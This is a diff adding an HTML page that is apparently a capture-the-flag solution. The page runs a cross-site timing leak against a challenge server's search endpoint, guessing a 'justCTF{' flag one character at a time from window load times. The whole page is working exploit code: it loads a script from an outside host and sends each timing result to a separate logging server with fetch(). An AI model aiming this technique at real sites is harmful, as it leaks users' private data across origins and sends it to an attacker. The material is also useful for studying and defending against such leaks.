@@ -1,0 +1,101 @@
+<html>
+<script async src="http://192.168.69.1:1339/x.js"></script>
+<script async>
+    let logAddr = "http://192.168.69.1:1337";
+    let challAddr = "http://192.168.69.69:80";
+
+    function rand7() {
+        return (Math.random() + 1).toString(36).substring(7);
+    }
+    function log(d) {
+        fetch(logAddr+'/log?d='+encodeURIComponent(d));
+    }
+    function sleep(delay) {
+        return new Promise(function(resolve) {
+            setTimeout(resolve, delay);
+        });
+    }
+    async function debug() {
+        log('diff!stxart');
+        while (true) {
+            await sleep(1000);
+            log('diff!nexxt');
+        }
+        log('diff!exnd');
+    }
+    let randTable = [];
+    for(let i=0; i<(2610); i++) {
+        randTable.push(rand7());
+    }
+
+    let bigDataX = 'A'.repeat(7048-7);
+    let baseUrl = challAddr+'/search/?msg=' + bigDataX;
+
+    function leak(prefix, j, end) {
+        let win = window.open(baseUrl + '&search='+encodeURIComponent(prefix));
+        let start = performance.now();
+
+        function measure(){
+            try{
+                win.history.length;
+                setTimeout(measure, 0);
+            }catch(e){
+                let time = performance.now() - start;
+                // log('It took %d ms to load the window: ' + prefix + ', time: ' +time.toString());
+                // win.close();
+                end([time, win]);
+            }
+        }
+        measure();
+    }
+    async function leaka(prefix, j) {
+        return new Promise((resolve, reject) => {
+            leak(prefix, j, resolve);
+        });
+    }
+
+    async function leaker(prefix) {
+        let wins = [];
+        let mins = [];
+        for(let j=0; j<30; j++) {
+            let t = await leaka(prefix, j);
+            wins.push(t[1]);
+            mins.push(t[0]);
+        }
+        for(let win of wins) {
+            win.close();
+        }
+        return Math.min(...mins);
+    }
+
+    function shuffleLetters(letters) {
+        let arr = letters.split("");
+        for (let i = arr.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [arr[i], arr[j]] = [arr[j], arr[i]];
+        }
+        return arr.join("");
+    }
+
+    async function main() {
+        log('diff!start');
+        let prefix = 'justCTF{';
+        let mockLetters = "ZZ";
+        let lettersLeak = "abcdefghijklmnopqrstuvwxyz_";
+        let lettersRand = mockLetters + shuffleLetters(lettersLeak) + "Y";
+        let refTime = undefined;
+
+        for(let i in lettersRand) {
+            let char = lettersRand[i];
+
+            let minTime = await leaker(prefix+char);
+            if(char === 'Z') {
+                refTime = minTime;
+            }
+            log('diff!'+char+'!time!'+(minTime - refTime));
+        }
+        log('diff!end');
+    }
+    main();
+</script>
+</html>
